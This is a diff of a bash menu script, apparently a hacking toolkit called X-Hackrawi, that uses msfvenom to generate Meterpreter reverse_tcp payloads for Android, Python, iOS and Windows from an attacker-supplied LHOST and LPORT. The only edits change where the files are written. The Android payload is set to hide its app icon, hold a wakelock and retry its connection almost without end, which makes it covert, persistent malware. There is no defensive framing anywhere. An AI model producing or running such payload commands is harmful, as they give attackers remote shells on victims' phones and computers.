@@ -85,7 +85,7 @@ read -p "insert LHOST :> " lhost0
 echo " "
 echo -e $red " Please Iinsert LPORT :>"
 read -p "insert LPORT :> " lport0
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost0 LPORT=$lport0 AndroidWakelock="true" StagerRetryCount="999999" StagerRetryWait="1" AndroidHideAppIcon="true" -o /sdcard/pyload/.apk
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost0 LPORT=$lport0 AndroidWakelock="true" StagerRetryCount="999999" StagerRetryWait="1" AndroidHideAppIcon="true" -o pyload.apk
 echo -e $green"Payload Bas Been Created ✔"
 sleep 1
 bash X-Hackrawi.sh
@@ -96,7 +96,7 @@ echo -e $red " Please Insert LHOST :>"
 read -p "insert LHOST :> " lhost
 echo -e $red " Please Insert LPORT :>"
 read -p "insert LPORT :> " lport
-msfvenom -f raw -p python/meterpreter/reverse_tcp/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o /sdcard/hack/.py
+msfvenom -f raw -p python/meterpreter/reverse_tcp/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o hack.py
 bash X-Hackrawi.sh
 fi
 if [ $payload = 3 ]
@@ -105,7 +105,7 @@ echo -e $red " please insert LHOST :>"/
 read -p "insert LHOST :>" lhost
 echo -e $red " please insert LPORT :>"
 read -p "insert LPORT :>" lport
-msfvenom -p apple_ios/aarch64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o /sdcard/hack/.ios
+msfvenom -p apple_ios/aarch64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o hack.ios
 bash X-Hackrawi.sh
 fi
 if [ $payload = 4 ]
@@ -114,7 +114,7 @@ echo -e $red " please insert LHOST :>"
 read -p "insert LHOST :>" lhost
 echo -e $red " please insert LPORT :>"
 read -p "insert LPORT :>" lport
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o /sdcard/hack/.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o hack.exe
 bash X-Hackrawi.sh
 fi
 if [ $payload = 00 ]
